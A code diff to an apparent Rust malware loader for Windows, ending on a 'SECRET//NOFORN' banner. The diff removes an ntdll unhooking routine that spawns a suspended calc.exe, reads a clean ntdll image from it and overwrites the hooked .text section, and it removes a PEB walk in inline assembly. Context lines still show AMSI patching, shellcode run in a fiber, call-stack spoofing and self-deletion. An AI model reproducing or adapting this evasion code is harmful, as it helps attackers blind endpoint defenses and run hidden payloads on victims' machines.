@@ -28,26 +28,19 @@ use std::{
 use crate::hooks::{initialize_hooks, destroy_hooks};
 pub use indirect_lib::{get_ssn_by_name, set_hw_bp};
 
-use ntapi::{
-    ntldr::LDR_DATA_TABLE_ENTRY,
-    ntpebteb::PEB,
-};
 
-use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER};
 
 use windows::{
     core::{s, Error, PCSTR, PSTR, Result},
     Win32::System::{
-        Diagnostics::Debug::{WriteProcessMemory, ReadProcessMemory},
+        Diagnostics::Debug::ReadProcessMemory,
         LibraryLoader::{GetProcAddress, LoadLibraryA},
         Memory::{
             VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE,
             PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
-            GetProcessHeap, HeapAlloc, HeapFree, HEAP_ZERO_MEMORY, HEAP_FLAGS,
         },
         Threading::{
             ConvertThreadToFiber, CreateFiber, GetCurrentProcess, SwitchToFiber,
-            CreateProcessA, STARTUPINFOA, PROCESS_INFORMATION, CREATE_SUSPENDED,
         },
     },
 };
@@ -80,86 +73,7 @@ fn main() -> Result<()> {
             println!("Failed: 211");
         }
 
-        // unhook ntdll
-        // benign process
-        let process = b"C:\\Windows\\System32\\calc.exe\0";
-        let module = get_ntdll_address();
 
-        // create process in suspended state
-        let si = STARTUPINFOA { cb: size_of::<STARTUPINFOA>() as u32, ..Default::default() };
-        let mut pi = PROCESS_INFORMATION::default();
-
-        CreateProcessA(
-            None,
-            Some(PSTR(process.as_ptr() as *mut u8)),
-            None, None, false, CREATE_SUSPENDED, None, None, &si, &mut pi,
-        )?;
-        // read clean DOS header
-        let mut remote_dos: IMAGE_DOS_HEADER = mem::zeroed();
-        let mut bytes_read = 0usize;
-        ReadProcessMemory(
-            pi.hProcess,
-            module.cast(),
-            &mut remote_dos as *mut _ as *mut c_void,
-            size_of::<IMAGE_DOS_HEADER>(),
-            Some(&mut bytes_read),
-        )?;
-
-        if remote_dos.e_magic != IMAGE_DOS_SIGNATURE {
-            panic!("Failed: 101");
-        }
-
-        let nt_hdr_addr = (module as usize + remote_dos.e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
-        let mut remote_nt: IMAGE_NT_HEADERS64 = mem::zeroed();
-        ReadProcessMemory(
-            pi.hProcess,
-            nt_hdr_addr.cast(),
-            &mut remote_nt as *mut _ as *mut c_void,
-            size_of::<IMAGE_NT_HEADERS64>(),
-            Some(&mut bytes_read),
-        )?;
-        // allocate memory in process for clean ntdll
-        let image_size = remote_nt.OptionalHeader.SizeOfImage as usize;
-        let heap = GetProcessHeap().unwrap();
-        let buffer_ntdll = HeapAlloc(heap, HEAP_ZERO_MEMORY, image_size) as *mut c_void;
-
-        ReadProcessMemory(
-            pi.hProcess,
-            module.cast(),
-            buffer_ntdll,
-            image_size,
-            Some(&mut bytes_read),
-        )?;
-        // find .text in clean copy
-        let section_base = (nt_hdr_addr as usize + size_of::<IMAGE_NT_HEADERS64>()) as *const IMAGE_SECTION_HEADER;
-        let mut text_local: *mut c_void = null_mut();
-        let mut text_clean: *mut c_void = null_mut();
-        let mut text_size: usize = 0;
-
-        for i in 0..remote_nt.FileHeader.NumberOfSections {
-            let sec = section_base.add(i as usize);
-            let name = std::str::from_utf8(&(*sec).Name).unwrap_or("").trim_end_matches('\0');
-
-            if name == ".text" {
-                text_local = (module as usize + (*sec).VirtualAddress as usize) as *mut c_void;
-                text_clean = (buffer_ntdll as usize + (*sec).VirtualAddress as usize) as *mut c_void;
-                text_size = *(*sec).Misc.VirtualSize() as usize;
-                break;
-            }
-        }
-
-        if text_local.is_null() {
-            panic!("Failed: 228");
-        }
-        // temporarily make .text writable
-        let mut old = PAGE_PROTECTION_FLAGS(0);
-        VirtualProtect(text_local, text_size, PAGE_EXECUTE_READWRITE, &mut old)?;
-        // overwrite hooked ntdll with clean
-        std::ptr::copy_nonoverlapping(text_clean as *const u8, text_local as *mut u8, text_size);
-        // restore protection
-        VirtualProtect(text_local, text_size, old, &mut old)?;
-
-        let _ = HeapFree(heap, HEAP_FLAGS(0), Some(buffer_ntdll));
 
         // patch AMSI
         let patch_opcode = 0x75u8;
@@ -292,7 +206,7 @@ fn main() -> Result<()> {
                 SwitchToFiber(shellcode_fiber);
                 // may not reach
                 if use_delete {
-                    let _ = suicide::delete_self(Some(pi.dwProcessId));
+                    let _ = suicide::delete_self(None);
                 }
             }
 
@@ -337,7 +251,7 @@ fn main() -> Result<()> {
                 // if spoof worked, suicide and exit
                 if spoofing_successful {
                     if use_delete {
-                        let _ = suicide::delete_self(Some(pi.dwProcessId));
+                        let _ = suicide::delete_self(None);
                     }
                     return Ok(());
                 }
@@ -391,7 +305,7 @@ fn main() -> Result<()> {
 
                 // attempt self-delete
                 if use_delete {
-                    let _ = suicide::delete_self(Some(pi.dwProcessId));
+                    let _ = suicide::delete_self(None);
                 }
             }
 
@@ -404,27 +318,6 @@ fn main() -> Result<()> {
     Ok(())
 }
 
-// get base address of ntdll.dll by walking PEB → Ldr linked list
-fn get_ntdll_address() -> *mut c_void {
-    unsafe {
-        let peb = NtCurrentPeb();
-        let first = (*(*peb).Ldr).InLoadOrderModuleList.Flink;
-        let ntdll_entry = (*first).Flink as *const LDR_DATA_TABLE_ENTRY;
-        (*ntdll_entry).DllBase.cast()
-    }
-}
-
-// grab PEB pointer
-#[inline(always)]
-#[allow(non_snake_case)]
-unsafe fn NtCurrentPeb() -> *const PEB {
-    #[cfg(target_arch = "x86_64")]
-    {
-        let peb: usize;
-        core::arch::asm!("mov {}, gs:[0x60]", out(reg) peb, options(nostack, preserves_flags));
-        peb as *const PEB
-    }
-}
 
 /*********************************************************************************
                             --- SECRET//NOFORN ---
